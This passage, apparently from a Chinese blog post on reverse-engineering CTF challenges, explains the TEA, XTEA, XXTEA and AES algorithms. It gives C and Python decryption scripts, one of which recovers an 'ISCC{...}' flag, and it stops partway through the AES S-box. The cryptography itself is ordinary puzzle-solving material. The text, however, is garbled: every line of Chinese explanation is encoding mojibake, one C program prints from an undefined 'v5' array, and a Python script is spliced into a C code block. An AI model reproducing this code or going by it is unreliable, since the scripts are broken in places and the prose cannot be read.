class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x61C88747</span>, sum = delta * (<span class="hljs-number">-64</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])^v0;<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>])^v1;<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>,<span class="hljs-number">0x5377654E</span>,<span class="hljs-number">0x21726174</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0xC19EA29C</span>,<span class="hljs-number">0xDC091F87</span>,<span class="hljs-number">0x91F6E33B</span>,<span class="hljs-number">0xF69A5C7A</span>,<span class="hljs-number">0x93529F20</span>,<span class="hljs-number">0x8A5B94E1</span>,<span class="hljs-number">0xF91D069B</span>,<span class="hljs-number">0x23B0E340</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">8</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h2><p>ä»åšé¢˜è§’åº¦æ¥è¯´å·®åˆ«ä¸å¤§</p><h2 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h2><p>ç›¸æ¯”xteaä¸teaï¼Œxxteaçš„å¤æ‚åº¦æ›´ä¸Šäº†ä¸€å±‚ï¼Œsubkeyçš„æ–¹å¼å˜ä¸ºå·²è¿›è¡Œçš„è½®æ•°çš„æœ€åä¸¤ä½ä¸deltaå åŠ çš„æœ€åä¸¤ä½ç›¸å¼‚æˆ–ï¼Œdeltaè¿­ä»£ä¸teaç›¸åŒï¼Œå¸¸è§æ˜¯9è½®å¾ªç¯ï¼Œå¾ªç¯é‡Œé¢å…ˆqå†pï¼Œqå°±æ˜¯å¾ªç¯çš„æ¬¡æ•°ï¼Œä¸º<strong>6+52&#x2F;(n+1)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z &gt;&gt; 5) ^ (y <span class="hljs-string">&lt;&lt; 2)) + ((y &gt;</span>&gt; 3) ^ (z &lt;&lt; 4))) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><br><span class="hljs-comment">//XXTEA åŠ å¯†ï¼Œåœ¨å¤„ç†æ•°æ®æµä¸­æ¯ä¸ªæ•°æ®æ—¶åˆ©ç”¨äº†ç›¸é‚»æ•°æ®ï¼Œä½¿ç”¨MXå‡½æ•°è®¡ç®—åŠ å¯†å€¼</span><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> * <span class="hljs-title function_">xxtea_uint_encrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * data, <span class="hljs-type">size_t</span> len, <span class="hljs-type">uint32_t</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = (<span class="hljs-type">uint32_t</span>)len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> z = data[n], y, p, q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / (n + <span class="hljs-number">1</span>), sum = <span class="hljs-number">0</span>, e;<br><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> data;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span> &lt; q--) &#123;<br>        sum += DELTA;<br>        <span class="hljs-comment">// æ ¹æ®sum è®¡ç®—å¾—å‡º0~3ä¸­çš„æŸä¸€ä¸ªæ•°å€¼, ç”¨äºMXä¸­ä¸på…±åŒä½œç”¨é€‰æ‹©keyæ•°ç»„ä¸­æŸä¸ªç§˜é’¥å€¼</span><br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br><br>        <span class="hljs-comment">//éå†æ¯ä¸ªå¾…åŠ å¯†çš„æ•°æ®</span><br>        <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n; p++) &#123;<br>            <span class="hljs-comment">//zçš„åˆå€¼ä¸ºdata[len - 1]ï¼Œå³å°†æ•°æ®æ•°ç»„å½“åšæ˜¯ç¯å½¢é˜Ÿåˆ—æ¥å¤„ç†çš„ï¼Œé¦–å°¾ç›¸è¿ï¼Œå½“åŠ å¯†data[0]æ—¶ï¼Œéœ€è¦ç”¨åˆ°data[len - 1]ï¼Œdata[0]ï¼Œdata[0 + 1]ï¼Œä»¥åŠMXè®¡ç®—è¿”å›çš„çš„ä¸€ä¸ªåŠ å¯†å€¼ï¼ŒåŠ å¯†å€¼ä¸data[0]ç›¸åŠ åè¾¾åˆ°åŠ å¯†çš„æ•ˆæœ</span><br>            y = data[p + <span class="hljs-number">1</span>];<br>            z = data[p] += MX;<br>        &#125;<br><br>        <span class="hljs-comment">//å½“åŠ å¯†data[len-1]æ—¶ï¼Œéœ€è¦ç”¨åˆ°data[len - 2]ï¼Œdata[len-1]ï¼Œdata[0]ï¼Œä»¥åŠMXè®¡ç®—è¿”å›çš„çš„ä¸€ä¸ªåŠ å¯†å€¼ï¼ŒåŠ å¯†å€¼ä¸data[len-1]ç›¸åŠ åè¾¾åˆ°åŠ å¯†çš„æ•ˆæœ</span><br>        y = data[<span class="hljs-number">0</span>];<br>        z = data[n] += MX;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> * <span class="hljs-title function_">xxtea_uint_decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> * data, <span class="hljs-type">size_t</span> len, <span class="hljs-type">uint32_t</span> * key)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> n = (<span class="hljs-type">uint32_t</span>)len - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">uint32_t</span> z, y = data[<span class="hljs-number">0</span>], p, q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / (n + <span class="hljs-number">1</span>), sum = q * DELTA, e;<br><br>    <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> data;<br><br>    <span class="hljs-keyword">while</span> (sum != <span class="hljs-number">0</span>) &#123;<br>        e = sum &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span>;<br><br>        <span class="hljs-keyword">for</span> (p = n; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>            z = data[p - <span class="hljs-number">1</span>];<br>            y = data[p] -= MX;<br>        &#125;<br><br>        z = data[n];<br>        y = data[<span class="hljs-number">0</span>] -= MX;<br>        sum -= DELTA;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰äº›æ²¡6+52&#x2F;(n+1)ï¼Œä½†è¿˜æ˜¯æœ‰å…¶ä»–ç‰¹å¾,è€Œä¸”deltaä¹Ÿå¾ˆæ˜æ˜¾</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1707985910721-26f9b574-a04a-4de6-8673-6e54e3769817.png" class="" title="img"><p>ä¸‹é¢æ˜¯è¿è¡Œè„šæœ¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x9e3779b9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z&gt;&gt;5^y<span class="hljs-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">//åŠ å¯†å‡½æ•°</span><br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++) &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>) &#123;  <span class="hljs-comment">//è§£å¯†å‡½æ•°</span><br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span> &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--) &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">9</span>] = &#123;<span class="hljs-number">689085350</span>, <span class="hljs-number">626885696</span>, <span class="hljs-number">1894439255</span>, <span class="hljs-number">1204672445</span>, <span class="hljs-number">1869189675</span>, <span class="hljs-number">475967424</span>, <span class="hljs-number">1932042439</span>, <span class="hljs-number">1280104741</span>, <span class="hljs-number">2808893494</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">12345678</span>, <span class="hljs-number">12398712</span>, <span class="hljs-number">91283904</span>, <span class="hljs-number">12378192</span>&#125;;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">9</span>;<br>    btea(v, -n, k);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9</span>; i ++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">8</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">16</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v[i] &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xff</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>import base64<br>from ctypes import *<br><br>enc=<span class="hljs-string">&quot;F8URvwNjuAYMN6GVXvgJE1Oe2ULWWow0WThUe0k95xTg60OY&quot;</span><br>data=<span class="hljs-built_in">list</span>(base64.b64decode(enc))<br>enc=[<span class="hljs-type">int</span>.from_bytes(data[i:i + <span class="hljs-number">4</span>], <span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(data),<span class="hljs-number">4</span>)]<br>key=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(ord,<span class="hljs-string">&quot;0M21I908n117gC1~&quot;</span>))<br>key=[<span class="hljs-type">int</span>.from_bytes(key[i:i + <span class="hljs-number">4</span>], <span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(key),<span class="hljs-number">4</span>)]<br><br><br>def MX(z, y, sum1, k, p, e):<br>    <span class="hljs-keyword">return</span>   c_uint32(((z.value&gt;&gt;<span class="hljs-number">5</span>^y.value&lt;&lt;<span class="hljs-number">2</span>)+(y.value&gt;&gt;<span class="hljs-number">3</span>^z.value&lt;&lt;<span class="hljs-number">4</span>))^((sum1.value^y.value)+(k[(p&amp;<span class="hljs-number">3</span>)^e.value]^z.value)))<br>def btea(v,k,n,delta):<br><br>    <span class="hljs-keyword">if</span> n&gt;<span class="hljs-number">1</span>:<br>        sum1=c_uint32(<span class="hljs-number">0</span>)<br>        z=c_uint32(v[n<span class="hljs-number">-1</span>])<br>        rounds=<span class="hljs-number">6</span>+<span class="hljs-number">52</span><span class="hljs-comment">//n</span><br>        e=c_uint32(<span class="hljs-number">0</span>)<br><br>        <span class="hljs-keyword">while</span> rounds&gt;<span class="hljs-number">0</span>:<br>            sum1.value+=delta<br>            e.value=((sum1.value&gt;&gt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">for</span> p in range(n<span class="hljs-number">-1</span>):<br>                y=c_uint32(v[p+<span class="hljs-number">1</span>])<br>                v[p] = c_uint32(v[p] + MX(z,y,sum1,k,p,e).value).value<br>                z.value=v[p]<br><br>            y=c_uint32(v[<span class="hljs-number">0</span>])<br>            v[n<span class="hljs-number">-1</span>] = c_uint32(v[n<span class="hljs-number">-1</span>] + MX(z,y,sum1,k,n<span class="hljs-number">-1</span>,e).value).value<br>            z.value=v[n<span class="hljs-number">-1</span>]<br>            rounds-=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        sum1=c_uint32(<span class="hljs-number">0</span>)<br>        n=-n<br>        rounds=<span class="hljs-number">6</span>+<span class="hljs-number">52</span><span class="hljs-comment">//(n+1)</span><br>        sum1.value=rounds*delta<br>        y=c_uint32(v[<span class="hljs-number">0</span>])<br>        e=c_uint32(<span class="hljs-number">0</span>)<br><br>        <span class="hljs-keyword">while</span> rounds&gt;<span class="hljs-number">0</span>:<br>            e.value=((sum1.value&gt;&gt;<span class="hljs-number">2</span>)&amp;<span class="hljs-number">3</span>)<br>            <span class="hljs-keyword">for</span> p in range(n<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>):<br>                z=c_uint32(v[p<span class="hljs-number">-1</span>])<br>                v[p] = c_uint32(v[p] - MX(z,y,sum1,k,p,e).value).value<br>                y.value=v[p]<br><br>            z=c_uint32(v[n<span class="hljs-number">-1</span>])<br>            v[<span class="hljs-number">0</span>] = c_uint32(v[<span class="hljs-number">0</span>] - MX(z,y,sum1,k,<span class="hljs-number">0</span>,e).value).value<br>            y.value=v[<span class="hljs-number">0</span>]<br>            sum1.value-=delta<br>            rounds-=<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    a=enc<br>    k= key<br>    delta=<span class="hljs-number">0x9e3779b9</span><br>    n=len(a)<br>    res=btea(a,k,-n,delta)<br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">    import libnum</span><br><span class="hljs-string">    for i in res:</span><br><span class="hljs-string">        flag+=(libnum.n2s(i)[::-1].decode())</span><br><span class="hljs-string">    print(&quot;ISCC&#123;&quot;+flag.strip()+&quot;&#125;&quot;)</span><br></code></pre></td></tr></table></figure><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>å‚è€ƒé“¾æ¥ï¼š <a href="https://zhuanlan.zhihu.com/p/78913397">https://zhuanlan.zhihu.com/p/78913397</a></p><h2 id="ç®—æ³•"><a href="#ç®—æ³•" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h2><p>AESç®—æ³•ä¸»è¦æœ‰å››ç§æ“ä½œå¤„ç†ï¼Œåˆ†åˆ«æ˜¯å¯†é’¥åŠ æ³•å±‚ã€å­—èŠ‚ä»£æ¢å±‚ã€è¡Œä½ç§»å±‚ã€åˆ—æ··æ·†å±‚ã€‚è€Œæ˜æ–‡xå’Œå¯†é’¥kéƒ½æ˜¯ç”±16ä¸ªå­—èŠ‚ç»„æˆçš„æ•°æ®</p><p>AESç®—æ³•åœ¨å¤„ç†çš„è½®æ•°ä¸Šåªæœ‰æœ€åä¸€è½®æ“ä½œä¸å‰é¢çš„è½®å¤„ç†ä¸Šæœ‰äº›è®¸ä¸åŒï¼Œåœ¨è½®å¤„ç†å¼€å§‹å‰è¿˜å•ç‹¬è¿›è¡Œäº†ä¸€æ¬¡è½®å¯†é’¥åŠ çš„å¤„ç†ã€‚åœ¨å¤„ç†è½®æ•°ä¸Šï¼Œæˆ‘ä»¬åªè€ƒè™‘<strong>128ä½å¯†é’¥çš„10è½®å¤„ç†</strong></p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1690008868545-fdc00de5-23b1-42c8-8d20-6418580919d6.png" class="" title="img"><h3 id="å­—èŠ‚ä»£æ¢"><a href="#å­—èŠ‚ä»£æ¢" class="headerlink" title="å­—èŠ‚ä»£æ¢"></a>å­—èŠ‚ä»£æ¢</h3><p>S_boxè¡¨æ˜¯é€šè¿‡æŸç§æ–¹æ³•è®¡ç®—å‡ºæ¥çš„ã€‚S_boxè¡¨æ˜¯ä¸€ä¸ªæ‹¥æœ‰256ä¸ªå­—èŠ‚å…ƒç´ çš„æ•°ç»„ï¼Œå¯ä»¥å°†å…¶å®šä¹‰ä¸ºä¸€ç»´æ•°ç»„ï¼Œä¹Ÿå¯ä»¥å°†å…¶å®šä¹‰ä¸º16Ã—16çš„äºŒç»´æ•°ç»„ï¼Œå¦‚æœå°†å…¶å®šä¹‰ä¸ºäºŒç»´æ•°ç»„ï¼Œè¯»å–S_boxæ•°æ®çš„æ–¹æ³•å°±æ˜¯è¦å°†è¾“å…¥æ•°æ®çš„<strong>æ¯ä¸ªå­—èŠ‚çš„é«˜å››ä½ä½œä¸ºç¬¬ä¸€ä¸ªä¸‹æ ‡ï¼Œä½å››ä½ä½œä¸ºç¬¬äºŒä¸ªä¸‹æ ‡</strong>ï¼Œ<strong>ä»sç›’ä¸­å–å‡ºå¹¶èµ‹ç»™å­—ç¬¦</strong></p><p>sç›’å’Œé€†sç›’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>] = &#123;<br><span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>,<br><span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>,<br><span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,<br><span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>,<br><span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,<br><span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>,<br><span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span 